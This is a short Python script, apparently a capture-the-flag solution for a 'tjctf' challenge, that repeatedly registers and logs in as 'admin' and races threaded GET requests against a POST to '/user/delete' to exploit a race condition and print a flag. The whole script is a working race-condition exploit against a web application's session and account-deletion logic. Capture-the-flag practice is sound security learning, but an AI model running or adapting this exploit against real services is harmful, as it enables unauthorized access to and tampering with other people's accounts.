import requests
import concurrent.futures

url = ''
def check_flag(method, cookie):
    if method == "GET":
        r= requests.get(url=url, cookies=cookie)
    elif method == "POST":
        r= requests.post(url=url + '/user/delete', data = {"password":"admin"},cookies=cookie)
        if "tjctf" in r.text:
            print(r.text)
        exit(0)
        
while True:
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        r = requests.post(url + "/register", data={"username":"admin", "password":"admin"}, allow_redirects=False)
        print(r.cookies)
        r = requests.post(url + "/login", data = {"username":"admin", "password":"admin"}, allow_redirects=False)
        futures.append(executor.submit(check_flag, method="GET", cookie=r.cookies))
        futures.append(executor.submit(check_flag, method="GET", cookie=r.cookies))
        futures.append(executor.submit(check_flag, method="GET", cookie=r.cookies))
        futures.append(executor.submit(check_flag, method="GET", cookie=r.cookies))
        futures.append(executor.submit(check_flag, method="POST", cookie=r.cookies))
        futures.append(executor.submit(check_flag, method="GET", cookie=r.cookies))
        futures.append(executor.submit(check_flag, method="GET", cookie=r.cookies))
        futures.append(executor.submit(check_flag, method="GET", cookie=r.cookies))
        futures.append(executor.submit(check_flag, method="GET", cookie=r.cookies))
        for future in concurrent.futures.as_completed(futures):
            print(future.result())